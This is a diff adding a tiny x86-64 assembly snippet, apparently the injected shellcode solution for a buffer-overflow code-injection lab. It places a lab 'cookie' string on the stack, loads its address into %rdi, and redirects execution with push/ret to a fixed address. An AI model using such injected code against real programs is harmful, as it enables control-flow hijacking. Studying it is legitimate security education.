@@ -1,0 +1,8 @@
+# cookie：0x59b997fa
+movq    $0x39623935, 0x30(%rsp)
+movq    $0x61663739, 0x34(%rsp)
+movb    $0x0, 0x38(%rsp)
+
+leaq    0x30(%rsp), %rdi
+push    $0x00000000004018fa
+ret
